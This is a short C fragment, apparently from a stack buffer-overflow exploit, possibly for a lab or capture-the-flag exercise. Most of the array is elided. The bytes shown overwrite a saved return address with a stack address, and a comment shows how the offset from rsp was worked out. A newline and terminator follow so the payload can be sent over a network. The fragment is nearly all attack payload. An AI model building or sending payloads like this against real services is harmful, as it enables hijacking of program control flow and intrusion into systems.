...
char compromise[224] = {
    ...
    0xB0, // Return Address rsp is: 0x7fffffffe168, I subtracted 152 (0x98), 0x7fffffffe168 - 0x98 = 7FFFFFFFDEB0
    0xDE,
    0xFF,
    0xFF,
    0xFF,
    0x7F,
    0x0A, // Newline (for network)
    0x00  // Terminator (for network)
};
